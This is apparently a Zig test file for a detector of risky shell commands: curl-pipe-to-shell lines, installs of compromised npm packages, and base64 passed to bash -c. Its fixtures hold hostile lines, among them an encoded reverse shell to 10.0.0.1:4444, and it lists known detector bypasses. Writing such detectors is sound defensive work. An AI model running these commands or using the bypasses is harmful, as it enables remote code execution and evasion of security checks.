const std = @import("std");
const testing = std.testing;
const mod = @import("patterns.zig");

const matchCurlPipeSh = struct {
    fn call(line: []const u8) ?[]const u8 {
        return mod.default_patterns[0].match(line);
    }
}.call;
const matchNpmUnsafe = struct {
    fn call(line: []const u8) ?[]const u8 {
        return mod.default_patterns[1].match(line);
    }
}.call;
const matchBashCBase64 = struct {
    fn call(line: []const u8) ?[]const u8 {
        return mod.default_patterns[2].match(line);
    }
}.call;

test "curl | sh — bare positive" {
    const hit = matchCurlPipeSh("curl https://example.com/install.sh | sh");
    try testing.expect(hit != null);
    try testing.expect(std.mem.startsWith(u8, hit.?, "curl "));
}

test "curl | bash — long target name OK" {
    const hit = matchCurlPipeSh("curl -L https://x.com | bash");
    try testing.expect(hit != null);
}

test "wget -O- | sh" {
    const hit = matchCurlPipeSh("wget -O- https://x | sh");
    try testing.expect(hit != null);
}

test "curl > file (no pipe to shell) — negative" {
    const hit = matchCurlPipeSh("curl https://x.com > install.sh");
    try testing.expect(hit == null);
}

test "curl | grep (pipe but not to shell) — negative" {
    const hit = matchCurlPipeSh("curl https://x.com | grep token");
    try testing.expect(hit == null);
}

test "curl | shenanigans (false-prefix protection)" {
    const hit = matchCurlPipeSh("curl https://x.com | shenanigans");
    try testing.expect(hit == null);
}

test "npm install event-stream — bad pkg, hit" {
    const hit = matchNpmUnsafe("npm install event-stream");
    try testing.expect(hit != null);
}

test "npm i event-stream — short verb form" {
    const hit = matchNpmUnsafe("npm i event-stream");
    try testing.expect(hit != null);
}

test "npm install lodash — clean pkg, no hit" {
    const hit = matchNpmUnsafe("npm install lodash");
    try testing.expect(hit == null);
}

test "pnpm add event-stream — covered" {
    const hit = matchNpmUnsafe("pnpm add event-stream");
    try testing.expect(hit != null);
}

test "yarn add ua-parser-js — covered" {
    const hit = matchNpmUnsafe("yarn add ua-parser-js");
    try testing.expect(hit != null);
}

test "npm install with version suffix — strips @" {
    const hit = matchNpmUnsafe("npm install colors@1.4.0");
    try testing.expect(hit != null);
}

test "npm install with flag — flags skipped" {
    const hit = matchNpmUnsafe("npm install --save-dev event-stream");
    try testing.expect(hit != null);
}

test "bash -c long base64 — hit" {
    // 80 chars of base64 alphabet.
    const payload = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK";
    var buf: [256]u8 = undefined;
    const line = try std.fmt.bufPrint(&buf, "bash -c \"{s}\"", .{payload});
    const hit = matchBashCBase64(line);
    try testing.expect(hit != null);
}

test "bash -c short literal — no hit" {
    const hit = matchBashCBase64("bash -c 'echo hi'");
    try testing.expect(hit == null);
}

test "bash -c long but with shell metachars — base64 ratio fails" {
    const hit = matchBashCBase64("bash -c 'echo $HOME; ls -la /tmp; cat /etc/passwd > /dev/null'");
    try testing.expect(hit == null);
}

test "sh -c long base64 — also covered" {
    const payload = "ZWNob2hlbGxvd29ybGRiYXNlNjRwYXlsb2FkdGhpc2lzYWxvbmdvbmU";
    var buf: [256]u8 = undefined;
    const line = try std.fmt.bufPrint(&buf, "sh -c '{s}'", .{payload});
    const hit = matchBashCBase64(line);
    try testing.expect(hit != null);
}

test "curl | sh — mid-line (after `&&`) still matches" {
    const hit = matchCurlPipeSh("cd /tmp && curl https://x | sh");
    try testing.expect(hit != null);
}

// ---------------------------------------------------------------------------
// Known V1 false negatives — pinned here so future tuning doesn't
// silently start catching them and call it a regression. The V2
// sidecar (encoder SLM) is the right layer for these.

test "INTENTIONAL false negative: bash <(curl …) process substitution" {
    const hit = matchCurlPipeSh("bash <(curl -L https://x.com/install.sh)");
    try testing.expect(hit == null);
}

test "INTENTIONAL false negative: eval $(curl …) command substitution" {
    const hit = matchCurlPipeSh("eval \"$(curl -fsSL https://x.com/install.sh)\"");
    try testing.expect(hit == null);
}

test "INTENTIONAL false negative: curl … | sudo sh (pipe target = sudo)" {
    const hit = matchCurlPipeSh("curl https://x.com | sudo sh");
    try testing.expect(hit == null);
}

test "INTENTIONAL false negative: bash -c mixed payload (b64 + literals)" {
    const hit = matchBashCBase64("bash -c \"echo c29tZWJhc2U2NA== | base64 -d | sh\"");
    try testing.expect(hit == null);
}
